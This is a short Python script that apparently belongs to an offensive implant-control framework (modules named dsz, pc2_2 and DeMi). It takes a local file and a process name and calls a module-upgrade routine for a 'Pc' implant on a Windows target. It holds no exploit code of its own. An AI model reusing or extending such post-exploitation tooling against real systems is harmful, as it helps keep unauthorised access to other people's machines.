
import dsz
import dsz.file
import dsz.lp
import dsz.menu
import dsz.payload
import dsz.version
import pc2_2

dsz.lp.AddResDirToPath("DeMi")

import demi
import demi.windows.module

import glob
import os
import re
import shutil
import sys


#------------------------------------------------------------------------------------------
def main(argv):
	dsz.control.echo.Off()
	
	localFile = argv[1]
	procName = argv[2]
	
	#return demi.windows.module.Upgrade("Pc", localFile, demi.registry.PC.Name, demi.registry.PC.Id, ask=False)
	return demi.windows.module.Upgrade("Pc", localFile, "", demi.registry.PC.Id, ask=False)

#------------------------------------------------------------------------------------------
if __name__ == '__main__':
	if (main(sys.argv) != True):
		sys.exit(-1);